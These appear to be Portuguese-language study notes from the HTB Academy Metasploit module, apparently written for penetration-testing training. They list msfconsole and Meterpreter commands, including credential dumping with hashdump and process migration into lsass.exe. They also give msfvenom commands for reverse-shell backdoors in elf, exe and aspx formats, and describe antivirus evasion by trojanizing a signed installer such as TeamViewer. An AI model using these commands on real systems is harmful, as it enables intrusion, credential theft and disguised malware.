# Ⓜ️ Using the Metasploit Framework - HTB Academy

Este repositório contém meus estudos e anotações sobre o **Metasploit Framework (MSF)**, a ferramenta de pentest mais utilizada no mundo. O foco deste módulo é entender a arquitetura, o uso do console, o poderoso Meterpreter e a criação de payloads customizados.

## 🏗️ 1. Arquitetura e Estrutura

O Metasploit é modular. No Kali/Parrot, os arquivos principais ficam em `/usr/share/metasploit-framework`.

### Tipos de Módulos
* **Auxiliary:** Scanners, fuzzers e sniffers. (Não geram shell, apenas coletam info).
* **Exploits:** Códigos que exploram vulnerabilidades para entregar um payload.
* **Payloads:** O código que roda no alvo após a invasão (ex: Reverse Shell).
* **Encoders:** Usados para ofuscar payloads (tentar burlar AV).
* **Post:** Módulos de pós-exploração (coleta de dados, pivotamento).
* **NOPs:** Instruções vazias para buffer overflow.

---

## 💻 2. MSFconsole: Comandos Essenciais

Interface de linha de comando principal.

**Básico:**
* `msfconsole -q`: Inicia em modo silencioso (sem banner).
* `help`: Ajuda.
* `search <termo>`: Busca módulos (filtro avançado: `search type:exploit platform:windows`).

**Configuração e Execução:**
* `use <numero>`: Seleciona o módulo pelo índice da busca.
* `show options`: Mostra o que precisa ser configurado.
* `show targets`: Mostra os sistemas alvo compatíveis.
* `set RHOSTS <IP>`: Define o IP do alvo.
* `set LHOST <IP>`: Define o seu IP (VPN/Tun0).
* `setg <variavel> <valor>`: Define uma variável **Globalmente** (para não repetir em todo módulo).
* `check`: Verifica vulnerabilidade sem atacar.
* `run` ou `exploit`: Executa o ataque.

---

## 🔄 3. Sessões e Jobs

O MSF permite gerenciar múltiplos ataques simultâneos.

### Sessões (Conexões Ativas)
* `sessions -l`: Lista sessões ativas.
* `sessions -i <ID>`: Entra/Interage com uma sessão.
* `background` (ou `Ctrl+Z`): Envia a sessão atual para o fundo sem fechar a conexão.

### Jobs (Tarefas em Background)
Útil para deixar um **Listener** rodando enquanto fazemos outras coisas.
* `exploit -j`: Roda o exploit como um Job.
* `jobs -l`: Lista jobs rodando.
* `jobs -K`: Mata todos os jobs.

---

## 🛠️ 4. Meterpreter: O Canivete Suíço

O **Meterpreter** é um payload avançado que roda inteiramente na memória (Stealth/Injeção DLL) e não escreve no disco do alvo.

**Comandos Principais:**
* `sysinfo`: Detalhes do SO alvo.
* `getuid`: Mostra qual usuário somos.
* `getsystem`: Tenta escalar privilégios para SYSTEM/Root automaticamente.
* `hashdump`: Extrai hashes de senha do banco SAM (precisa de privilégio).
* `upload` / `download`: Transferência de arquivos.
* `shell`: Cai para o CMD ou Bash nativo do sistema.

**⚠️ Dica de Estabilidade (Migrate):**
Se o processo invadido for instável, mova-se para um processo do sistema:
1.  `ps`: Lista processos.
2.  `migrate <PID>`: Migra para o processo (ex: `explorer.exe`, `lsass.exe`).

---

## 🧪 5. Importando Módulos Externos

Muitas vezes o exploit não está no MSF oficial, mas está no **Exploit-DB**.

1.  Localize o script (ex: `searchsploit nagios`).
2.  Copie o arquivo `.rb` para a pasta pessoal do MSF:
    ```bash
    cp exploit.rb ~/.msf4/modules/exploits/linux/http/nome_do_exploit.rb
    ```
3.  No console, atualize e use:
    ```bash
    reload_all
    use exploit/linux/http/nome_do_exploit
    ```

---

## 💉 6. MSFVenom: Payloads Customizados

Ferramenta para criar executáveis maliciosos (Backdoors) quando não usamos exploits automáticos.

**Sintaxe:**
`msfvenom -p <PAYLOAD> <OPÇÕES> -f <FORMATO> -o <SAIDA>`

**Exemplos:**
* **Linux (.elf):**
    `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf -o backup.elf`
* **Windows (.exe):**
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o payload.exe`
* **Web (.aspx):**
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f aspx -o shell.aspx`

---

## 🛡️ 7. Evasão de Antivírus e Firewall

Técnicas para tentar passar despercebido pelas defesas.

1.  **Templates (`-x`):** A técnica mais eficaz. Injeta o payload dentro de um programa legítimo e assinado (ex: TeamViewer, Putty).
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp ... -x teamviewer.exe -k -f exe -o teamviewer_mod.exe
    ```
    *(A flag `-k` mantém o programa original funcionando).*

2.  **Arquivos Compactados:** Colocar o malware em `.zip` ou `.rar` **com senha**. O AV não consegue escanear o conteúdo.

3.  **Encoders (`-e`):** (Ex: `shikata_ga_nai`). Remove caracteres ruins, mas hoje em dia é facilmente detectado por AVs modernos se usado sozinho.

4.  **Criptografia:** O MSF6 usa criptografia AES nativa na comunicação do Meterpreter, o que ajuda a evitar detecção de rede (IDS/IPS).
